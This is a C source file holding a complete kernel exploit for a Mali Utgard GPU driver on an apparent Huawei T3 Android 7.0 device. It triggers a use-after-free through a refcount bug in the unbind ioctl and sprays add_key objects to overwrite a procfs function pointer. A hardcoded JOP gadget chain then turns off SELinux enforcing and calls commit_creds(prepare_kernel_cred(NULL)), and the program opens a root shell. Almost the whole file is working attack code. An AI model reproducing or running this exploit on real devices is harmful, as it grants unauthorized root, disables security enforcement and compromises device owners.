#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/socket.h> 
#include <netinet/in.h> 
#include <arpa/inet.h> 
#include <sys/syscall.h>

// addresses for getting root
#define PREPARE_KERNEL_CRED_ADDR 0xc0049c5c
#define COMMIT_CREDS_ADDR        0xc0049578
#define SELINUX_ENFORCING_ADDR   0xc0dc8c44

#define PROC_FILE "/proc/driver/wmt_dbg"

#define FAKE_MALI_ALLOC_BUFF_SIZE 96
#define PATTERN_SIZE 0x200

// Mali definitions
#define MALI_IOC_BASE           0x82
#define _MALI_UK_MEMORY_SUBSYSTEM    1
#define MALI_IOC_MEMORY_BASE    (_MALI_UK_MEMORY_SUBSYSTEM + MALI_IOC_BASE)

#define _MALI_UK_ALLOC_MEM      0
#define _MALI_UK_FREE_MEM       1
#define _MALI_UK_UNBIND_MEM     3

#define MALI_IOC_MEM_ALLOC                  _IOWR(MALI_IOC_MEMORY_BASE, _MALI_UK_ALLOC_MEM, _mali_uk_alloc_mem_s)
#define MALI_IOC_MEM_FREE                   _IOWR(MALI_IOC_MEMORY_BASE, _MALI_UK_FREE_MEM, _mali_uk_free_mem_s)
#define MALI_IOC_MEM_UNBIND                 _IOWR(MALI_IOC_MEMORY_BASE, _MALI_UK_UNBIND_MEM, _mali_uk_unbind_mem_s)

typedef struct {
    uint64_t ctx;                   // [in,out] user-kernel context
    uint32_t gpu_vaddr;             // [in] GPU virtual address  
    uint32_t vsize;                 // [in] virtual size of the allocation
    uint32_t psize;                 // [in] physical size of the allocation
    uint32_t flags;                 // [in] allocation flags
    uint32_t backend_handle;        // [out] backend handle
    // int32_t secure_shared_fd;       // [in] the mem handle for secure mem
} _mali_uk_alloc_mem_s;

typedef struct {
	uint64_t ctx;                      /**< [in,out] user-kernel context (trashed on output) */
	uint32_t gpu_vaddr;                /**< [in] use as handle to free allocation */
	uint32_t free_pages_nr;      /** < [out] record the number of free pages */
} _mali_uk_free_mem_s;

typedef struct {
    uint64_t ctx;                // User-kernel context
    uint32_t flags;              // Flags
    uint32_t vaddr;              // Mali address
} _mali_uk_unbind_mem_s;

typedef struct {
    void *addr;
    size_t size;
    int success;
} mmap_result_t;

#define KEY_SPEC_PROCESS_KEYRING -2
#define KEYCTL_REVOKE 3

typedef int32_t key_serial_t;


// spoofed structures for spray
struct allocation_manager {
    uint32_t vm_lock;           // offset 0x0 - set to 0x0
    uint8_t padding[0xc];       // padding to fill space
};

struct kernel_mutex {
    volatile int32_t lock_count;  // Must be at offset 0x0
    int32_t padding[3];           // Padding to get owner at offset 0x10
    void* owner;                  
};

// Structure for session
struct session {
    uint8_t padding[0xd8];               // padding to reach offset 0xe0
    struct allocation_manager alloc_mgr; // offset 0xd8 - allocation manager
    struct kernel_mutex mutex_lock;
};

// Structure for mali vma node
struct mali_vma_node {
    uint8_t padding[0x8];  
    uint32_t target_field;      // offset 0x8 - this needs to be 0
};

static struct allocation_manager g_alloc_mgr;
static struct session g_session;
static struct mali_vma_node g_vma_node;


// Direct syscall wrapper - no header needed
static inline key_serial_t add_key(const char *type, const char *desc,
                                    const void *payload, size_t plen,
                                    key_serial_t ringid)
{
    return syscall(__NR_add_key, type, desc, payload, plen, ringid);
}

static inline long keyctl_revoke(key_serial_t key)
{
    return syscall(__NR_keyctl, KEYCTL_REVOKE, key);
}


// exploit won't work without this ;)
void important_ascii_art() {
    printf("\n\033[38;5;225m");
    printf("███████ ██████  ███████ ██      ███████ \n");
    printf("\033[38;5;183m");
    printf("██      ██   ██ ██      ██      ██      \n");
    printf("\033[38;5;141m");
    printf("█████   ██████  █████   ██      ███████ \n");
    printf("\033[38;5;99m");
    printf("██      ██   ██ ██      ██           ██ \n");
    printf("\033[38;5;57m");
    printf("██      ██   ██ ███████ ███████ ███████ \n\n");
    printf("             Huawei T3 7.0\n");
    printf("\n\033[0m");
}


_mali_uk_alloc_mem_s mali_alloc_memory(int mali_fd, _mali_uk_alloc_mem_s input) {
    _mali_uk_alloc_mem_s result = input;
    
    int ret = ioctl(mali_fd, MALI_IOC_MEM_ALLOC, &result);
    
    if (ret == -1) {
        printf("  ERROR: %s (errno: %d)\n", strerror(errno), errno);
    }
    
    return result;
}


mmap_result_t mali_mmap_allocation(int mali_fd, uint32_t gpu_vaddr) {
    mmap_result_t mapping;
    
    printf("[+] Memory mapping GPU address 0x%08x...\n", gpu_vaddr);
    
    // mmap the Mali allocation using its GPU virtual address as offset
    // The GPU virtual address becomes the offset for mmap
    void *mapped_addr = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, 
                            mali_fd, gpu_vaddr);
    
    mapping.size = 4096;
    
    if (mapped_addr == MAP_FAILED) {
        mapping.addr = NULL;
        mapping.success = 0;
        printf("[+] Mapping failed\n");
    } else {
        mapping.addr = mapped_addr;
        mapping.success = 1;
        printf("[+] Successfully mapped\n");
    }
    
    return mapping;
}


void mali_do_munmap(mmap_result_t mapping) {
    if (mapping.success && mapping.addr) {
        if (munmap(mapping.addr, mapping.size) != 0) {
            printf("  Failed to unmap %p: %s\n", mapping.addr, strerror(errno));
        }
    }
}

typedef struct
{
    uint32_t pattern[PATTERN_SIZE];
    uint8_t written[PATTERN_SIZE];
} PatternBuffer;

void pattern_init(PatternBuffer *pb, uint32_t fill_value)
{
    for (size_t i = 0; i < PATTERN_SIZE; i++)
    {
        pb->pattern[i] = fill_value;
        pb->written[i] = 0x0;
    }
}

void pattern_set(PatternBuffer *pb, size_t offset, uint32_t value)
{
    if (offset % 4 != 0)
    {
        fprintf(stderr, "[ERROR] Unaligned offset 0x%zx\n", offset);
        exit(1);
    }

    size_t idx = offset / 4;

    if (idx >= PATTERN_SIZE)
    {
        fprintf(stderr, "[ERROR] Offset 0x%zx out of bounds\n", offset);
        exit(1);
    }

    if (pb->written[idx])
    {
        fprintf(stderr, "[CONFLICT] Offset 0x%zx written twice!\n", offset);
    }

    pb->pattern[idx] = value;
    pb->written[idx] = 0x1;
}

#define P(pb, off, val) pattern_set(pb, off, val)


int trigger_overwritten_function_pointer() {
    int fd;
    
    // Try to open the device normally
    fd = open(PROC_FILE, O_RDONLY);
    if (fd < 0) {
        return 1;
    }

    // build JOP patterm
    PatternBuffer pb;
    pattern_init(&pb, 0x0);

    

    // Gets an allocation in kmalloc-128, sets freelist pointer at start to 0x0 using memcpy
    // turns off selinux enforcing, then executes commit_creds(prepare_kernel_cred(NULL)) to get root

    // Save stack values
    //   c02a5470 0d c0 a0 e1     cpy        r12,sp
    //   c02a5474 f0 d8 2d e9     stmdb      sp!,{r4,r5,r6,r7,r11,r12,lr,pc}
    //   c02a5478 04 b0 4c e2     sub        r11,r12,#0x4
    //   c02a547c 04 30 91 e5     ldr        r3,[r1,#0x4]
    //   c02a5480 01 50 a0 e1     cpy        r5,r1
    //   c02a5484 28 60 91 e5     ldr        r6,[r1,#0x28]
    //   c02a5488 00 70 a0 e1     cpy        r7,r0
    //   c02a548c 33 ff 2f e1     blx        r3

    P(&pb, 0x4, 0xc06491d8); // r3, next gadget
    P(&pb, 0x28, 0x0); // r6


    // need to call this function at address 0xc0041394 and store 0x0 at the start of it, this will break loop in freelist
    // void FUN_c0041394(void)

    // {
    //   int iVar1;

    //   iVar1 = kmalloc_2(_DAT_c0db7e10,0x80d0,0x58);
    //   if (iVar1 == 0) {
    //     return;
    //   }
    //   *(int *)iVar1 = iVar1;
    //   *(int *)(iVar1 + 4) = iVar1;
    //   *(int *)(iVar1 + 0x18) = iVar1 + 0x18;
    //   *(int *)(iVar1 + 0x1c) = iVar1 + 0x18;
    //   *(int *)(iVar1 + 0x28) = iVar1 + 0x28;
    //   *(int *)(iVar1 + 0x2c) = iVar1 + 0x28;
    //   *(undefined4 *)(iVar1 + 0x34) = 8;
    //   return;
    // }

    // jop base is in r1, r5, and r9 rn

    //   c06491d8 38 30 91 e5     ldr        r3,[r1,#0x38]
    //   c06491dc 01 40 a0 e1     cpy        r4,r1
    //   c06491e0 00 50 a0 e1     cpy        r5,r0
    //   c06491e4 00 00 53 e3     cmp        r3,#0x0
    //   c06491e8 01 00 00 0a     beq        LAB_c06491f4
    //   c06491ec 01 00 a0 e1     cpy        r0,r1
    //   c06491f0 33 ff 2f e1     blx        r3
    P(&pb, 0x38, 0xc0362444); // r3, next gadget

    // now in r0, r1, r4, r9

    //   c0362444 20 30 94 e5     ldr        r3,[r4,#0x20]
    //   c0362448 00 50 a0 e1     cpy        r5,r0
    //   c036244c 24 00 94 e5     ldr        r0,[r4,#0x24]
    //   c0362450 33 ff 2f e1     blx        r3
    P(&pb, 0x20, 0xc033bd74); // r3, next gadget
    P(&pb, 0x24, 0x0); // r0, unused


    //   c033bd74 10 30 95 e5     ldr        r3,[r5,#0x10]
    //   c033bd78 05 00 a0 e1     cpy        r0,r5
    //   c033bd7c 33 ff 2f e1     blx        r3
    //   c033bd80 2c 31 95 e5     ldr        r3,[r5,#0x12c]
    //   c033bd84 05 00 a0 e1     cpy        r0,r5
    //   c033bd88 33 ff 2f e1     blx        r3
    P(&pb, 0x10, 0xc0041394); // r3, function address
    P(&pb, 0x12c, 0xc07fd0bc); // r3, next gadget

    //   c07fd0bc 00 30 90 e5     ldr        r3,[r0,#0x0]
    //   c07fd0c0 04 10 a0 e1     cpy        r1,r4
    //   c07fd0c4 02 00 a0 e1     cpy        r0,r2
    //   c07fd0c8 33 ff 2f e1     blx        r3
    P(&pb, 0x0, 0xc03dcb7c); // r3, next gadget

    //   c03dcb7c 64 31 94 e5     ldr        r3,[r4,#0x164]
    //   c03dcb80 0c 30 93 e5     ldr        r3,[r3,#0xc]
    //   c03dcb84 00 00 53 e3     cmp        r3,#0x0
    //   c03dcb88 00 90 a0 e1     cpy        r9,r0
    //   c03dcb8c 01 00 00 0a     beq        LAB_c03dcb98
    //   c03dcb90 05 00 a0 e1     cpy        r0,r5
    //   c03dcb94 33 ff 2f e1     blx        r3
    uint32_t offset = 0xc;
    P(&pb, 0x164, (uint32_t) (pb.pattern + (offset / 4))); // r3, pointer to pointer to next gadget
    P(&pb, offset + 0xc, 0xc0661a10); // r3, next gadget

    //   c0661a10 00 30 a0 e3     mov        r3,#0x0
    //   c0661a14 18 30 09 e5     str        r3,[r9,#-0x18]
    //   c0661a18 04 10 a0 e1     cpy        r1,r4
    //   c0661a1c d0 20 a0 e3     mov        r2,#0xd0
    //   c0661a20 08 30 90 e5     ldr        r3,[r0,#0x8]
    //   c0661a24 10 30 93 e5     ldr        r3,[r3,#0x10]
    //   c0661a28 33 ff 2f e1     blx        r3
    offset = 0x1c;
    P(&pb, 0x8, (uint32_t) (pb.pattern + (offset / 4))); // r3, pointer to pointer to next gadget
    P(&pb, offset + 0x10, 0xc02aa0d4); // r3, next gadget


    // freelist should now be fixed, next up is turning off selinux
    // jop start is in r0, r1, r4, r5
    // r10 contains 0x0, we can use that

    //   c02aa0d4 90 30 94 e5     ldr        r3,[r4,#0x90]
    //   c02aa0d8 80 00 84 e2     add        r0,r4,#0x80
    //   c02aa0dc 08 30 93 e5     ldr        r3,[r3,#0x8]
    //   c02aa0e0 33 ff 2f e1     blx        r3
    offset = 0x5c;
    P(&pb, 0x90, (uint32_t) (pb.pattern + (offset / 4))); // r3, pointer to pointer to next gadget
    P(&pb, offset + 0x8, 0xc001a7cc); // r3, next gadget

    //   c001a7cc 3c 30 90 e5     ldr        r3,[r0,#0x3c]
    //   c001a7d0 00 50 a0 e1     cpy        r5,r0
    //   c001a7d4 0c 41 90 e5     ldr        r4,[r0,#0x10c]
    //   c001a7d8 d4 30 93 e5     ldr        r3,[r3,#0xd4]
    //   c001a7dc 33 ff 2f e1     blx        r3
    uint32_t r0_offset = 0x80;
    offset = 0x0;
    P(&pb, r0_offset + 0x3c, (uint32_t) (pb.pattern + (offset / 4))); // r3, pointer to pointer to next gadget
    P(&pb, r0_offset + 0x10c, SELINUX_ENFORCING_ADDR - 0xa8); // r4, location of selinux enforcing - 0xa8
    P(&pb, offset + 0xd4, 0xc06588b4); // r3, next gadget

    //   c06588b4 a8 a0 84 e5     str        r10,[r4,#0xa8]
    //   c06588b8 08 30 90 e5     ldr        r3,[r0,#0x8]
    //   c06588bc 10 30 93 e5     ldr        r3,[r3,#0x10]
    //   c06588c0 33 ff 2f e1     blx        r3
    offset = 0x50;
    P(&pb, r0_offset + 0x8, (uint32_t) (pb.pattern + (offset / 4))); // r3, pointer to pointer to next gadget
    P(&pb, offset + 0x10, 0xc0276dd8); // r3, next gadget


    // now do the good old commit_creds(prepare_kernel_creds(NULL))
    // jop base is in r1, jop base + 0x80 is in r0, r5
    // r8 is zero (we can use this to get NULL into r0)

    //   c0276dd8 80 20 95 e5     ldr        r2,[r5,#0x80]
    //   c0276ddc 08 00 a0 e1     cpy        r0,r8
    //   c0276de0 30 10 92 e5     ldr        r1,[r2,#0x30]
    //   c0276de4 34 60 92 e5     ldr        r6,[r2,#0x34]
    //   c0276de8 31 ff 2f e1     blx        r1
    offset = 0x68;
    uint32_t r6_offset = 0x90;
    P(&pb, r0_offset + 0x80, (uint32_t) (pb.pattern + (offset / 4))); // r2, nice chunk of memory for next loads
    P(&pb, offset + 0x30, 0xc043a63c); // r1, next gadget
    P(&pb, offset + 0x34, (uint32_t) (pb.pattern + (r6_offset / 4))); // r6, some safe function table ting

    //   c043a63c 14 30 96 e5     ldr        r3,[r6,#0x14]
    //   c043a640 33 ff 2f e1     blx        r3
    //   c043a644 5c 30 96 e5     ldr        r3,[r6,#0x5c]
    //   c043a648 00 00 53 e3     cmp        r3,#0x0
    //   c043a64c 00 00 00 0a     beq        LAB_c043a654
    //   c043a650 33 ff 2f e1     blx        r3
    P(&pb, r6_offset + 0x14, PREPARE_KERNEL_CRED_ADDR); // r3, address of prepare_kernel_cred()
    P(&pb, r6_offset + 0x5c, 0xc05e5018); // r3, next gadget

    //   c05e5018 38 30 95 e5     ldr        r3,[r5,#0x38]
    //   c05e501c 05 10 a0 e1     cpy        r1,r5
    //   c05e5020 33 ff 2f e1     blx        r3
    P(&pb, r0_offset + 0x38, 0xc0296390); // r3, next gadget

    //   c0296390 01 60 a0 e1     cpy        r6,r1
    //   c0296394 19 00 00 0a     beq        LAB_c0296400 // hope this doesnt break anything lul
    //   c0296398 0c 30 95 e5     ldr        r3,[r5,#0xc]
    //   c029639c 33 ff 2f e1     blx        r3
    P(&pb, r0_offset + 0xc, 0xc043a63c); // r3, next gadget

    //   c043a63c 14 30 96 e5     ldr        r3,[r6,#0x14]
    //   c043a640 33 ff 2f e1     blx        r3
    //   c043a644 5c 30 96 e5     ldr        r3,[r6,#0x5c]
    //   c043a648 00 00 53 e3     cmp        r3,#0x0
    //   c043a64c 00 00 00 0a     beq        LAB_c043a654
    //   c043a650 33 ff 2f e1     blx        r3
    P(&pb, r0_offset + 0x14, COMMIT_CREDS_ADDR); // r3, address of commit_creds()
    P(&pb, r0_offset + 0x5c, 0xc00322b4); // r3, next gadget


    // Try a small read
    ssize_t bytes_read = read(fd, pb.pattern, sizeof(pb.pattern));
    
    close(fd);
    
    return 0;
}

int main() {
    important_ascii_art();

    int mali_fd;

    // Open the Mali device
    mali_fd = open("/dev/mali", O_RDWR);
    if (mali_fd < 0) {
        perror("[-] Failed to open /dev/mali");
        return -1;
    }
    printf("[+] Successfully opened /dev/mali (fd=%d)\n", mali_fd);


    // STEP 1: Use MALI_IOC_MEM_ALLOC to create mali_alloc object in kmalloc-128
    printf("\n[1] Allocate victim mali_alloc\n");
    _mali_uk_alloc_mem_s victim_mali_alloc_input = {0};
    victim_mali_alloc_input.ctx = 0;
    victim_mali_alloc_input.gpu_vaddr = 0x0;
    victim_mali_alloc_input.vsize = 4096;
    victim_mali_alloc_input.psize = 4096;
    victim_mali_alloc_input.flags = 0x0;
    victim_mali_alloc_input.backend_handle = 0;
    
    _mali_uk_alloc_mem_s result = mali_alloc_memory(mali_fd, victim_mali_alloc_input);
    
    printf("[+] Mali allocation successful!\n");
    printf("    GPU VAddr: 0x%08x\n", result.gpu_vaddr);
    printf("    Backend Handle: 0x%08x\n", result.backend_handle);

    

    // STEP 2: Do mmap on this to increment the refcount associated with the mali_alloc object
    printf("\n[2] Doing mali_alloc mmap\n");

    uint32_t victim_mmap_offset = result.gpu_vaddr;
    mmap_result_t mapping = mali_mmap_allocation(mali_fd, victim_mmap_offset);
    
    if (!mapping.success) {
        printf("[-] Failed to create mapping\n");
        close(mali_fd);
        return -1;
    }


    // STEP 3: NOW USE THE BUG TO DECREMENT THE REFCOUNT IN THE VICTIM OBJECT TO JUST BEFORE UAF
    printf("\n[3] Calling MALI_IOC_MEM_UNBIND on victim to decrement refcount\n");
    
    _mali_uk_unbind_mem_s unbind_params;
    memset(&unbind_params, 0, sizeof(unbind_params));
    unbind_params.ctx = result.ctx;
    unbind_params.vaddr = result.gpu_vaddr;
    unbind_params.flags = 0x100; // _MALI_MEMORY_BIND_BACKEND_UMP
    
    int ioc_result = ioctl(mali_fd, MALI_IOC_MEM_UNBIND, &unbind_params);
    if (ioc_result != 0) {
        printf("[-] UNBIND failed: %s\n", strerror(errno));
    }


    // STEP 4: Setup for add_key spray
    printf("\n[4] Setting up add_key spray for fake mali_alloc\n");

        // init structures for UAF (fake mali_alloc)
    memset(&g_alloc_mgr, 0, sizeof(g_alloc_mgr));
    memset(&g_session, 0, sizeof(g_session));
    memset(&g_vma_node, 0, sizeof(g_vma_node));
    
    g_alloc_mgr.vm_lock = 0x0; // vm_lock at offset 0x0 = 0x0
    g_session.alloc_mgr = g_alloc_mgr;
    g_session.mutex_lock.lock_count = 1; // Initialize to unlocked state (1 = unlocked)
    g_session.mutex_lock.owner = 0x0;
    g_vma_node.target_field = 0x0; // mali vma node has 0 at offset 0x8


    // build the fake structure to spray
    uint32_t fake_mali_alloc_buff[FAKE_MALI_ALLOC_BUFF_SIZE / 4];
    memset(fake_mali_alloc_buff, 0x0, sizeof(fake_mali_alloc_buff));

    // set refcount to 1 to cause the free to be called in our UAF object
    fake_mali_alloc_buff[0x4c / 4] = 0x00000001; 

    // Set offset 0x3c to 0x00000000 (mali_alloc->mali_vma_node).field13_0x1c)
    fake_mali_alloc_buff[0x3c / 4] = 0x00000000;

    // Set offset 0xc (index 3) to contain pointer to session (requirement 2)
    fake_mali_alloc_buff[0xc / 4] = (uintptr_t)&g_session;

    // Set offset 0x20 (index 8) to contain pointer to mali vma node (requirement 3)
    fake_mali_alloc_buff[0x28 / 4] = 0x00000000; // set refcount to 1

    // overwrite list pointers to point to shellcode
    fake_mali_alloc_buff[0x40 / 4] = 0xc09ab49c - 0x4; // where to write it (wmt_dbg read function pointer)
    fake_mali_alloc_buff[0x44 / 4] = (uint32_t)0xc02a5470 - 0x4; // what to write (address of shellcode - 0x4)


    // STEP 5: TRIGGER UAF AND SPRAY
    printf("\n[5 + 6] Triggering UAF and spraying with add_key then doing munmap for write\n");

    // Trigger unbind to free the object
    ioctl(mali_fd, MALI_IOC_MEM_UNBIND, &unbind_params);
    
    // Spray using add_key - this allocates in kmalloc-128
    key_serial_t spray_key = add_key("user", "spray_0", fake_mali_alloc_buff, sizeof(fake_mali_alloc_buff), KEY_SPEC_PROCESS_KEYRING);

    // STEP 6: CALL MUNMAP ON THE VICTIM TO DECREMENT THE TARGET POINTER IN THE UAF OBJECT
    mali_do_munmap(mapping);


    // Now we have free'd that memory twice and we have looped the freelist
    // This means that every allocation on this cpu in the kmalloc-128 cache will keep recieving this memory
    // We can fix the freelist by breaking the loop
    // The SLUB allocator uses first 8 bytes of free memory to store a pointer to the next free element
    // If we set this to null and dont free the memory, the chain will be broken and this should fix everything
    // Just make sure we don't free the returned memory again
    
    // Seems a bit happier when we call it twice? Might be a quirk of memcpy or something
    trigger_overwritten_function_pointer();
    trigger_overwritten_function_pointer();

    printf("\n[7] Triggered JOP chain via %s...\n", PROC_FILE); // dont waste time printing before trigger, gotta fix the freelist ASAP


    // Cleanup: revoke and free key
    printf("\n[8] Cleanup\n");
    if (spray_key > 0) {
        keyctl_revoke(spray_key);
    }
    
    close(mali_fd);
    printf("\n[*] Done! Lets see if we got root...\n");

    if (getuid() == 0) {
        printf("[+] We got root! Popping shell...\n");
        char* shell = "/system/bin/sh";
        char* args[] = {shell, "-i", NULL};
        execve(shell, args, NULL);
    } else {
        printf("[-] Utgard won the battle but not the war... try again\n");
    }

    return 0;
}